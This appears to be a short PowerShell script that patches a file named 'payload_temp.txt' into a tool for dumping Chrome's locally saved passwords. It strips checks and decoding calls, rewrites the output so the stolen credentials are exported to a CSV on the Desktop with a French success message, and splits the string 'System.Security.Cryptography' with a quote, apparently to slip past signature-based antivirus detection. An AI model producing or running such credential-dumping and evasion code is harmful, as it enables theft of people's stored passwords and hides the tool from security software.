$c = Get-Content 'payload_temp.txt' -Raw
$c = $c -replace '#requires -version 7', ''
$c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'
$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
$c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
$c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
Set-Content "regex_fixed2.ps1" -Value $c
